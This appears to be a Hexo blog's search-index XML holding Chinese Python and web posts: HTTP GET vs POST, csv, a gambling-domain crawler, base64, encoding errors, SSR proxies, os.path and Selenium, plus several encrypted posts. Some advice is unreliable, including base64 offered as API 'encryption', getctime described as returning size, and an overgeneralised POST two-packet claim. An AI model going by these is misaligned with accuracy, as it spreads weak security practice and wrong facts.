不同的浏览器（发起http请求）和服务器（接受http请求）就是不同的运输公司。 虽然理论上，你可以在车顶上无限的堆货物（url中无限加参数）。但是运输公司可不傻，装货和卸货也是有很大成本的，他们会限制单次运输量来控制风险，数据量太大对浏览器和服务器都是很大负担。 业界不成文的规定是，（大多数）浏览器通常都会限制url长度在2K个字节，而（大多数）服务器最多处理64K大小的url。超过的部分，恕不处理。如果你用GET服务，在request body偷偷藏了数据，不同服务器的处理方式也是不同的，有些服务器会帮你卸货，读出数据，有些服务器直接忽略，所以，虽然GET可以带request body，也不能保证一定能被接收到哦。 好了，现在你知道，GET和POST本质上就是TCP链接，并无差别。但是由于HTTP的规定和浏览器/服务器的限制，导致他们在应用过程中体现出一些不同。 ###0x06 偏底层理解 这位BOSS有多神秘？当你试图在网上找“GET和POST的区别”的时候，那些你会看到的搜索结果里，从没有提到他。他究竟是什么呢。。。 GET和POST还有一个重大区别，简单的说： GET产生一个TCP数据包；POST产生两个TCP数据包。 长的说： 对于GET方式的请求，浏览器会把http header和data一并发送出去，服务器响应200（返回数据）； 而对于POST，浏览器先发送header，服务器响应100 continue，浏览器再发送data，服务器响应200 ok（返回数据）。 也就是说，GET只需要汽车跑一趟就把货送到了，而POST得跑两趟，第一趟，先去和服务器打个招呼“嗨，我等下要送一批货来，你们打开门迎接我”，然后再回头把货送过去。 因为POST需要两步，时间上消耗的要多一点，看起来GET比POST更有效。因此Yahoo团队有推荐用GET替换POST来优化网站性能。但这是一个坑！跳入需谨慎。为什么？ GET与POST都有自己的语义，不能随便混用。 据研究，在网络环境好的情况下，发一次包的时间和发两次包的时间差别基本可以无视。而在网络环境差的情况下，两次包的TCP在验证数据包完整性上，有非常大的优点。 并不是所有浏览器都会在POST中发送两次包，Firefox就只发送一次。]]></content>
      <categories>
        <category>html</category>
      </categories>
      <tags>
        <tag>http</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python处理csv文件]]></title>
    <url>%2F2019%2F05%2F13%2Fpython%E5%A4%84%E7%90%86csv%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[CSV(Comma-Separated Values)即逗号分隔值，可以用Excel打开查看。由于是纯文本，任何编辑器也都可打开。以至于python保存数据量小的文件大多使用csv。 0x01 CSV文件特点CSV文件中： 值没有类型，所有值都是字符串 不能指定字体颜色等样式 不能指定单元格的宽高，不能合并单元格 没有多个工作表 不能嵌入图像图表 在CSV文件中，以,作为分隔符，分隔两个单元格。像这样a,,c表示单元格a和单元格c之间有个空白的单元格。依此类推。 不是每个逗号都表示单元格之间的分界。所以即使CSV是纯文本文件，也坚持使用专门的模块进行处理。Python内置了csv模块。 0x02 写入数据到csvwriter单行写入 123456789101112import csv# 使用数字和字符串的数字都可以datas = [[&apos;name&apos;, &apos;age&apos;], [&apos;Bob&apos;, 14], [&apos;Tom&apos;, 23], [&apos;Jerry&apos;, &apos;18&apos;]]with open(&apos;example.csv&apos;, &apos;w&apos;, newline=&apos;&apos;) as f: writer = csv.writer(f) for row in datas: writer.writerow(row) writer多行写入 12# 还可以写入多行writer.writerows(datas) DictReader单行写入 123456789101112131415import csvheaders = [&apos;name&apos;, &apos;age&apos;]datas = [&#123;&apos;name&apos;:&apos;Bob&apos;, &apos;age&apos;:23&#125;, &#123;&apos;name&apos;:&apos;Jerry&apos;, &apos;age&apos;:44&#125;, &#123;&apos;name&apos;:&apos;Tom&apos;, &apos;age&apos;:15&#125; ]with open(&apos;example.csv&apos;, &apos;w&apos;, newline=&apos;&apos;) as f: # 标头在这里传入，作为第一行数据 writer = csv.DictWriter(f, headers) writer.writeheader() for row in datas: writer.writerow(row) DictReader多行写入 12# 还可以写入多行writer.writerows(datas) 0x03 读取csv数据reader读取数据 12345678import csvfilename = &apos;test.csv&apos;with open(filename) as f: reader = csv.reader(f) for row in reader: # 行号从1开始 print(reader.line_num, row) DictReader读取数据 123456789import csvfilename = &apos;test.csv&apos;with open(filename) as f: reader = csv.DictReader(f) for row in reader: # Max TemperatureF是表第一行的某个数据，作为key max_temp = row[&apos;Max TemperatureF&apos;] print(max_temp)]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>csv</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[关于博彩域名采集的过程]]></title>
    <url>%2F2019%2F05%2F13%2F%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%BD%A9%E5%9F%9F%E5%90%8D%E9%87%87%E9%9B%86%E7%9A%84%E8%BF%87%E7%A8%8B%2F</url>
    <content type="text"><![CDATA[目标采集10万条关于博彩方面的域名，博彩域名的时效性比较低，所以结果就没公布出来。这篇文记录如何获取域名的心路，涉及技术少。 0x01 起因接到一个挑战，说是要类似博彩网站的域名，而且这一要的量就是10W＋。域名采集是一个比较琐碎的活，不能类比于其他的爬虫数据都能够很好地看到与爬取，这个域名采集的话就不容易收集，虽然都是在互联网上但是我并没有发现那个网站能很统一的收集此类域名。 另一个让我哭笑不得的事情，之前给这位老哥爬取过网站数据，大概5w的数据只收了他80，而且那次的爬虫还不容易，事后都觉得亏大了，这次搜集域名，他自信的说，我给你160，气得我没话说。什么时候爬虫工程师的劳动力这么不值钱了？wtf！！！ 0x02 思考后来我在想如果搜集域名，我该如何进行呢？这类域名还都是关于博彩类型。当时的想法去一些域名爆破网站。提取某些段的域名，然后获取这些域名的title，然后利用分词判断是否博彩网站，后来一想这个方法的效率真的是太低了。 然后想着使用爬虫，爬取某些网站的所有a的href，通过得到的a在进行爬取，深度遍历网站。爬取的域名用集合的方式进行过滤，去重。 在构思爬虫与实践写爬虫的时候出现了很大的分歧。 url过滤去重这个方面，不能确定是过滤域名哪些特征，因为爬取的a-href千奇百怪，在获取到的a-href不能重组。 a-href的方式不再是原来的的简单的标签，现在一些网站已经加上了js的操作，或者跳转到一个内置的页面，总之简单的爬取方式失效。 如果爬到一些非博彩网站的链接，就会直接产生一个无底洞，一直索引好的域名。 0x03 行动这一部分的编码应该是我按照之前的想法，是一个错误的示例，有许多都不能够实现，效果也不明显 从google搜索了一些关键字菠菜网站,摘抄其中的一些域名作为起始的链接。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586#!/usr/bin/env python# -*- coding: utf-8 -*-&quot;&quot;&quot;__author__ = &apos;AJay&apos;__mtime__ = &apos;2019/5/12 0012&apos;&quot;&quot;&quot;import requestsimport urllibfrom db import MongoUrlimport timeimport threadingfrom urllib.parse import urlparsefrom pyquery import PyQuery as pqclass DomainSpider(): def __init__(self): self.dburl = MongoUrl() self.url_set = set() self.headers = &#123; &quot;User-Agent&quot;: &quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.12 Safari/537.36&quot;&#125; def parse_a(self, srart_url, html): d = pq(html) title = d(&apos;title&apos;).text() self.dburl.find_one_update_new_title(srart_url, title) def req_news_a(self): while True: start_url_obj = self.dburl.find_one_update_flag1() if not start_url_obj: print(&apos;url已经全部扫描完毕&apos;) time.sleep(5) continue url_list = start_url_obj.get(&apos;url&apos;).split(&apos;\n&apos;) # print(urlparse(url_list[0])) if &apos;http&apos; not in url_list[0]: new_url = &apos;http://&apos; + url_list[0] else: new_url = url_list[0] print(&apos;起始url&apos;, new_url) try: # if 1==1: req = requests.get(url=new_url, headers=self.headers, timeout=30,verify=False) if req.status_code &lt; 400: req.encoding = req.apparent_encoding text = req.text # 获取所有的a ，并解析url 然后判断主域名是否在site中 self.parse_a(srart_url=start_url_obj.get(&apos;url&apos;), html=text) else: print(&apos;请求请求是400&apos;, ) self.dburl.update_url_flag0(start_url_obj.get(&apos;url&apos;)) except Exception as e: # 网站没有反爬。一般超时重新请求 print(&apos;请求超时&apos;, e) self.dburl.update_url_flag0(start_url_obj.get(&apos;url&apos;)) def run(self): thread_list = [] for i in range(11): Treq_page = threading.Thread(target=self.req_news_a) thread_list.append(Treq_page) for t in thread_list: # t.setDaemon(True) t.start() # t.join()if __name__ == &apos;__main__&apos;: ds = DomainSpider() ds.run() 0x03 中转看到数据库中的数据，这样的采集效率实在够呛。然后在网上找有没有收录恶意域名的网站。https://jubao.anquan.org/exposure这是一个举报网站的网站。里面的数据可以查询到3年前，而且数据量很大，但是数据大多是网站被黑或者被骗，博彩类寥寥无几。 0x04 高潮正在打算放弃回去的时候。去关闭网页，然后看到之前打开的zoomeye和fofa。我苦苦寻找这么久，这个不就是我们要找的资产吗。通过查看fofa语法，直接返回域名，然后就根据批量爬取，找到fofa的会员账号，先测试官方的api接口，官方只出了一个python2版本的库，打开后发现库不是很那，果断改成了python3，然后刚测了两下就说f币不够。看来官方的api接口还要钱，但是在api sdk中一点都没介绍。 今晚又是不眠夜。 那就只能传统的爬取，使用大佬给的爬取软件，发现软件是请求的时间间隔固定，访问几分钟就不返回信息，而且返回的信息只有url，不太满足我这边的需求。 然后就写自己的爬虫，调用浏览器、获取信息、解析信息。一切妥妥的。后来发现fofa的查询只支持1000页的查询。所有想要获取更多的信息，就要用语法进行限制。这里选用了这几种过滤方式：1地区（美国、香港、中国）、2时间（after与before），再加上关键字，数据量已经足够。 0x05 结果由于限制了爬虫速率，1个小时才爬取了1W条数据。 而且同一台电脑还不能进行两个浏览器同时爬取，接下来一天只能慢慢等喽！]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>爬虫</tag>
        <tag>博彩</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python3中base64编码与解码]]></title>
    <url>%2F2019%2F05%2F13%2Fpython3%E4%B8%ADbase64%E7%BC%96%E7%A0%81%E4%B8%8E%E8%A7%A3%E7%A0%81%2F</url>
    <content type="text"><![CDATA[在项目中我常常使用base64对接口报文进行加密处理，这种方式虽然没有太高深的加密方式，但是仍然能提高接口的逼格。 0x01 base64优缺点优点：速度快，ascil编码，属于一次加密缺点：容易破解，只能使用在非关键信息的场合 0x02 python2与python3对比python2 12345678python2中进行Base64编码和解码&gt;&gt;&gt; import base64&gt;&gt;&gt; s = &apos;我是字符串&apos;&gt;&gt;&gt; a = base64.b64encode(s)&gt;&gt;&gt; print aztLKx9fWt/u0rg==&gt;&gt;&gt; print base64.b64decode(a)我是字符串 python3 python3不太一样：因为3.x中字符都为unicode编码，而b64encode函数的参数为byte类型，所以必须先转码。 123456import base64encodestr = base64.b64encode(&apos;abcr34r344r&apos;.encode(&apos;utf-8&apos;))print(encodestr)打印结果为b&apos;YWJjcjM0cjM0NHI=&apos; 结果和我们预想的有点区别，我们只想要获得YWJjcjM0cjM0NHI=，而字符串被b’’包围了。这时肯定有人说了，用正则取出来就好了。。。别急。。。b 表示 byte的意思，我们只要再将byte转换回去就好了。。。源码如下 直接进行转译 123456import base64encodestr = base64.b64encode(&apos;abcr34r344r&apos;.encode(&apos;utf-8&apos;))print(str(encodestr,&apos;utf-8&apos;))打印结果为YWJjcjM0cjM0NHI=]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
        <tag>base64</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初关于博客域名解析错误]]></title>
    <url>%2F2019%2F05%2F04%2F%E5%88%9D%E5%85%B3%E4%BA%8E%E5%8D%9A%E5%AE%A2%E5%9F%9F%E5%90%8D%E8%A7%A3%E6%9E%90%E9%94%99%E8%AF%AF%2F</url>
    <content type="text"><![CDATA[人生苦短我用python]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>windows</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[初探python——scrapy爬虫]]></title>
    <url>%2F2019%2F05%2F04%2F%E5%88%9D%E6%8E%A2python%E2%80%94%E2%80%94scrapy%E7%88%AC%E8%99%AB%2F</url>
    <content type="text"><![CDATA[欢迎来到我的博客，输入密码继续阅读. U2FsdGVkX18rPsx5zi9EXo3wkclDcfMbUhi9xWtPR8DYDe0jBF2VbD0UiMgPlnPl0KJTrMFyG+8FTTc/JW/aka8JdKfgX4CoLP0n1b7O9bS0LMzw4U4Zhy2IVa2nL2N1NkFXSI3vud/Al3Gv0V3SRWnU1lCpFxnxQYVGkBioVgtvgc1IjUuBVjiQcHR8lToVXvjp/beWdvTQ8riIyjpaog==]]></content>
      <categories>
        <category>python爬虫</category>
      </categories>
      <tags>
        <tag>python爬虫</tag>
        <tag>scrapy</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows创建用户]]></title>
    <url>%2F2019%2F05%2F04%2Fwindows%E5%88%9B%E5%BB%BA%E7%94%A8%E6%88%B7%2F</url>
    <content type="text"><![CDATA[欢迎来到我的博客，输入密码继续阅读. U2FsdGVkX1+e2h8VzHyi9LAv6nx5Ixuf7SFYeZ/hQjeCiNd+2GY8B4n+k07lE5kKPb6s0vXG7N2fGjg1c4+rC2q2AeDPW0qjCEJoyO8dAHw/4q3BWD6RR2fTb2QrMaT5BeR11ca4N/pUWx5P605mx+Qe0iSWWdW+UYaMtra6U5rA1Yy90dEVjC4aPL7apodVSa2HX+zvylrGKIIN1iHPoQ==]]></content>
      <categories>
        <category>windows</category>
      </categories>
      <tags>
        <tag>windows创建用户</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[网站页面自动定时刷新]]></title>
    <url>%2F2019%2F05%2F04%2F%E7%BD%91%E7%AB%99%E9%A1%B5%E9%9D%A2%E8%87%AA%E5%8A%A8%E5%AE%9A%E6%97%B6%E5%88%B7%E6%96%B0%2F</url>
    <content type="text"><![CDATA[欢迎来到我的博客，输入密码继续阅读. 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]]></content>
      <categories>
        <category>破解</category>
      </categories>
      <tags>
        <tag>windos</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[解决python3_UnicodeEncodeError_'gbk']]></title>
    <url>%2F2019%2F05%2F04%2F%E8%A7%A3%E5%86%B3python3_UnicodeEncodeError_'gbk'%2F</url>
    <content type="text"><![CDATA[从网上抓了一些字节流，想打印出来结果发生了一下错误： UnicodeEncodeError: ‘gbk’ codec can’t encode character ‘\xbb’ in position 8530: illegal multibyte sequence 代码1234import urllib.requestres=urllib.request.urlopen(&apos;http://www.baidu.com&apos;)htmlBytes=res.read()print(htmlBytes.decode(&apos;utf-8&apos;)) 错误信息让人很困惑，为什么用的是’utf-8’解码，错误信息却提示’gbk’错误呢？ 不仅如此，从百度首页的html中发现以下代码：1&lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html;charset=utf-8&quot;&gt; 这说明网页的确用的是utf-8，为什么会出现Error呢？ 在python3里，有几点关于编码的常识 字符就是unicode字符，字符串就是unicode字符数组如果用以下代码测试，print(&#39;a&#39;==&#39;\u0061&#39;)会发现结果为True，足以说明两者的等价关系。 str转bytes叫encode，bytes转str叫decode，如上面的代码就是将抓到的字节流给decode成unicode数组我根据上面的错误信息分析了字节流中出现\xbb的地方，发现有个\xc2\xbb的特殊字符»，我怀疑是它无法被解码。用以下代码测试后 1print(b&apos;\xc2\xbb&apos;.decode(&apos;utf-8&apos;)) 它果然报错了:UnicodeEncodeError: &#39;gbk&#39; codec can&#39;t encode character &#39;\xbb&#39; in position 0: illegal multibyte sequence 上网找了下utf-8编码表，发现的确特殊字符»的utf-8形式就是c2bb,unicode是&#39;\u00bb&#39;，为什么无法解码呢。。。仔细看看错误信息，它提示’gbk’无法encode，但是我的代码是utf-8无法decode，压根牛头不对马嘴，终于让我怀疑是print函数出错了。。于是立即有了以下的测试print(&#39;\u00bb&#39;)结果报错了：UnicodeEncodeError: &#39;gbk&#39; codec can&#39;t encode character &#39;\xbb&#39; in position 0: illegal multibyte sequence 原来是print()函数自身有限制，不能完全打印所有的unicode字符。知道原因后，google了一下解决方法，其实print()函数的局限就是Python默认编码的局限，因为系统是win7的，python的默认编码不是’utf-8’,改一下python的默认编码成’utf-8’就行了 1234567import ioimport sysimport urllib.requestsys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&apos;utf8&apos;) #改变标准输出的默认编码res=urllib.request.urlopen(&apos;http://www.baidu.com&apos;)htmlBytes=res.read()print(htmlBytes.decode(&apos;utf-8&apos;)) 运行后不报错了，但是居然有好多乱码（英文显示正常，中文则显示乱码）！！又一阵折腾后发现是控制台的问题，具体来说就是我在cmd下运行该脚本会有乱码，而在IDLE下运行却很正常。 由此我推测是cmd不能很好地兼容utf8，而IDLE就可以，甚至在IDLE下运行，连“改变标准输出的默认编码”都不用，因为它默认就是utf8。如果一定要在cmd下运行，那就改一下编码，比如我换成“gb18030”，就能正常显示了： sys.stdout = io.TextIOWrapper(sys.stdout.buffer,encoding=&#39;gb18030&#39;) 改变标准输出的默认编码最后，附上一些常用的和中文有关的编码的名称，分别赋值给encoding，就可以看到不同的效果了： 编码名称 用途 utf8 所有语言 gbk 简体中文 gb2312 简体中文 gb18030 简体中文 big5 繁体中文 big5hkscs 繁体中文]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python 错误</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python脚本走ssr代理爬虫]]></title>
    <url>%2F2019%2F05%2F04%2Fpython%E8%84%9A%E6%9C%AC%E8%B5%B0ssr%E4%BB%A3%E7%90%86%E7%88%AC%E8%99%AB%2F</url>
    <content type="text"><![CDATA[python脚本走ssr代理爬虫，访问外网,解除了我之前的疑问 在我之前的认知里，我不太了解这个代理的真正含义，总想着用python爬虫爬取外网的话就要本地连接vps，我意识中的代理只用在国内的爬虫，显然到今天才知道这样是不对的。 requests库一样可以ssr的代理。 在我使用代理查看国外的文章时候，无意间f12看到网页请求的地址竟然是本地127.0.0.1:1081，我就尝试使用requests加上代理能不能访问，结果是可以的。 1234567891011import requestsimport timedef req_tianmao(url): proxies = &#123; &quot;http&quot;: &quot;http://127.0.0.1:1080&quot;, &quot;https&quot;: &quot;http://127.0.0.1:1080&quot;, &#125; req = requests.get(url,proxies=proxies) text = req.text return text 然后使用异步协程aiohttp,发现源码里没有使用https代理的的情况，原作者说这将是一件麻烦的事情。 123456789101112 self.proxies = &#123; &quot;http&quot;: &quot;http://127.0.0.1:1081&quot;, &quot;https&quot;: &quot;http://127.0.0.1:1081&quot;, &#125;async def get(self, url): async with aiohttp.ClientSession() as session: async with session.get(url, proxy=self.proxies.get(&apos;http&apos;), timeout=30) as resp: print(&apos;网站的状态&apos;, resp.status) print(resp.url) result = await resp.text() return result 记录开启新世界的一次探索]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python爬虫</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python文件路径操作总结]]></title>
    <url>%2F2019%2F05%2F04%2Fpython%E6%96%87%E4%BB%B6%E8%B7%AF%E5%BE%84%E6%93%8D%E4%BD%9C%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[在读文件的时候往往需要遍历文件夹，python的os.path包含了很多文件、文件夹操作的方法 下面列出： os.path.abspath(path) #返回绝对路径os.path.basename(path) #返回文件名os.path.commonprefix(list) #返回多个路径中，所有path共有的最长的路径。os.path.dirname(path) #返回文件路径os.path.exists(path) #路径存在则返回True,路径损坏返回Falseos.path.lexists #路径存在则返回True,路径损坏也返回Trueos.path.expanduser(path) #把path中包含的”~”和”~user”转换成用户目录os.path.expandvars(path) #根据环境变量的值替换path中包含的”$name”和”${name}”os.path.getatime(path) #返回最后一次进入此path的时间。os.path.getmtime(path) #返回在此path下最后一次修改的时间。os.path.getctime(path) #返回path的大小os.path.getsize(path) #返回文件大小，如果文件不存在就返回错误os.path.isabs(path) #判断是否为绝对路径os.path.isfile(path) #判断路径是否为文件os.path.isdir(path) #判断路径是否为目录os.path.islink(path) #判断路径是否为链接os.path.ismount(path) #判断路径是否为挂载点（）os.path.join(path1[, path2[, …]]) #把目录和文件名合成一个路径os.path.normcase(path) #转换path的大小写和斜杠os.path.normpath(path) #规范path字符串形式os.path.realpath(path) #返回path的真实路径os.path.relpath(path[, start]) #从start开始计算相对路径os.path.samefile(path1, path2) #判断目录或文件是否相同os.path.sameopenfile(fp1, fp2) #判断fp1和fp2是否指向同一文件os.path.samestat(stat1, stat2) #判断stat tuple stat1和stat2是否指向同一个文件os.path.split(path) #把路径分割成dirname和basename，返回一个元组os.path.splitdrive(path) #一般用在windows下，返回驱动器名和路径组成的元组os.path.splitext(path) #分割路径，返回路径名和文件扩展名的元组os.path.splitunc(path) #把路径分割为加载点与文件os.walk(path, visit, arg) #遍历path，进入每个目录都调用visit函数，visit函数必须有3个参数(arg, dirname, names)，dirname表示当前目录的目录名，names代表当前目录下的所有文件名，args则为walk的第三个参数os.path.supports_unicode_filenames #设置是否支持unicode路径名 方法一 : 利用函数 os.walk()os.walk() 会返回三元元组 (dirpath, dirnames, filenames)dirpath : 根路径 (字符串)dirnames : 路径下的所有目录名 (列表)filenames : 路径下的所有非目录文件名 (列表) 其中目录名和文件名都是没有加上根路径的，所以需要完整路径时需要将目录名或文件名与根路径连接起来。示例 :123456import osroot = &quot;C:\\dir&quot;for dirpath, dirnames, filenames in os.walk(root): for filepath in filenames: print os.path.join(dirpath, filepath) 方法二 : 利用函数 os.listdir(), os.path.isdir(), os.path.isfile() os.listdir() 可以列出路径下所有文件和目录名，但是不包括当前目录., 上级目录.. 以及子目录下的文件.os.path.isfile() 和 os.path.isdir() 判断当前路径是否为文件或目录 示例 :123456789import osdef listDir(rootDir): for filename in os.listdir(rootDir): pathname = os.path.join(rootDir, filename) if (os.path.isfile(filename)): print pathname else: listDir(pathname)]]></content>
      <categories>
        <category>python基础</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[pythonSelenium实战跳坑]]></title>
    <url>%2F2019%2F05%2F03%2FpythonSelenium%E5%AE%9E%E6%88%98%E8%B7%B3%E5%9D%91%2F</url>
    <content type="text"><![CDATA[pythonSelenium实战跳坑关于启动selenium开启DevTools listening 当我使用selenium操作google浏览器的时候，用pycharm运行没问题，可是用终端运行 就会卡在监听1234def do_work(self,urls): chrome_options = webdriver.ChromeOptions() chrome_options.add_argument(&apos;--disk-cache-dir=./cache&apos;) self.browser = webdriver.Chrome(chrome_options=chrome_options) 终端显示1DevTools listening on ws://127.0.0.1:21466/devtools/browser/a7850440-0dfa-4837-9366-109ca4bbd523 解决方式 关闭已打开的Chrome后台实例，初始化Chrome实例时指定driver的path。]]></content>
      <categories>
        <category>python</category>
      </categories>
      <tags>
        <tag>python</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[python切换宽带账号]]></title>
    <url>%2F2019%2F05%2F02%2Fpython%E5%88%87%E6%8D%A2%E5%AE%BD%E5%B8%A6%2F</url>
